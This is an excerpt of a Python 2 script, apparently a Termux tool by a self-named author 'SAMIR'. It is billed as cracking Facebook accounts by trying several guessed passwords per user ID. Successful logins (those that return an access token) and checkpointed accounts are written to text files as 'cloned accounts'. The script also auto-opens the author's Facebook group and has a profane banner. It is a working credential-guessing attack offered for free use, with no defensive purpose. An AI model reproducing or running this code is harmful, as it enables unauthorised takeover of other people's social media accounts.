# MY FD ID @ITS.SAMIR
# MY FB  GROUP @CCT
#MY GITHUB https://github.com/KAZI2135kK
#THIS SCRIPT FREE 
...
Mking_page = random.choice(["https://www.facebook.com/FOURKANUDDIN123"])
...
def telegram():
	Style_profaisor("  please Join To FACEBOOK Group :) Thank you")
	os.system("xdg-open https://facebook.com/groups/termux.command.2022/")
...
\033[1;97m--------------------------------------------------
\033[1;91m Author      : SAMIR 
\033[1;91m GitHub      : https://github.com/KAZI2135kK
\033[1;91m Facebook     : Fourkan uddin tanvir
\033[1;91m I Fuck My World  
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY SAMIR'
        print '\x1b[1;92m THISE SCRIPT CREATED BY SAMIR '
        print '\x1b[1;92m              ENJOY THSI COMMEND  '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[samir_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[samir_CP] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[samir_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[samir_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[samir_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('samir.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[samir_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('samir.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[samir_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('samir.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[samir_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('samir.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[samir_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('samir.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[samir_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('samir.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : samir.txt'
